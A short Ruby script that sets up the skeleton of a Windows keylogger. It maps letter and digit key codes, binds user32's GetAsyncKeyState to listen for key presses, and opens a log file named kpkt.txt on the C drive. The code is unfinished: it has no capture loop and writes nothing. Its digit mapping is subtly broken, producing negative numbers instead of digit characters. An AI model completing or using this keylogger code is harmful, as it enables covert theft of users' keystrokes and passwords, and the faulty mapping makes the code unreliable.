require 'Win32API'

# create empty Hash of key codes
keys = Hash.new

# add letters
(0x41..0x5A).each { |code| keys[code.chr] = code }

# add numbers
(0x30..0x39).each { |code| keys[0x30-code] = code }

# create a listener for Windows key-presses
listener = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')

logs = File.open('C://kpkt.txt', 'a')
logs.close()